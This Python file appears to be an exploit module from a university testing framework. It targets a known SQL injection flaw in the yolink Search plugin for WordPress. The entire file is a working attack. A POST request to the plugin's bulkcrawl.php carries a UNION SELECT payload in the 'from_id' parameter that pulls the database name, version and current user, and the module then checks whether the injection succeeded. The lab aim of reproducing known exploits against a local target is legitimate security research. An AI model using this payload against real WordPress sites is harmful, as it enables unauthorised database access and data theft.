
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.

import framework  
import urllib
import httplib
  

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_74832",
                  'Description' : "yolink Search Plugin for WordPress contains a flaw "      \
                                  "that may allow an attacker to carry out an SQL "          \
                                  "injection attack. The issue is due to the "               \
                                  "wp-content/plugins/yolink-search/includes/bulkcrawl.php " \
                                  "script not properly sanitizing user-supplied input "      \
                                  "to the 'from_id' and 'batch_size' parameters",
                  'References' : [['OSVDB','74832'],
                                  ['http://osvdb.org/show/osvdb/74574'],
                                  ['http://www.exploit-db.com/exploits/17757']],
                  'Target' : "Wordpress 3.2",
                  'Type' : "SQL",
                  'Plugin' : "yolink Search Plugin 1.1.4",
                  'Privileged' : False
                  }
                    
    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return

    def setup(self, target_system_dir):
        return

    def exploit(self):
        form_data = urllib.urlencode({'page' : '-1',
                                      'from_id' : '-1 UNION ALL SELECT CONCAT_WS(CHAR(58),database(),version(),current_user()),NULL-- -',
                                      'batch_size' : '-1'})

        headers = {"Host":"127.0.0.1",
                   "Content-Type":"application/x-www-form-urlencoded",
                   "Accept": "application/json, text/javascript, */*;"
                   }
        
        conn = httplib.HTTPConnection("127.0.0.1")
        conn.request("POST",
                     "http://127.0.0.1/wordpress/wp-content/plugins/yolink-search/includes/bulkcrawl.php",
                     form_data,
                     headers)
        
        response = conn.getresponse()
        data = response.read()
        conn.close()
        
        if data.find("wordpress") != -1:
            self.logger.info("SQL injection successful")
            self.verified = True
        else:
            self.logger.info("Failed SQL injection")

        return                

    def verify(self):
        
        return self.verified
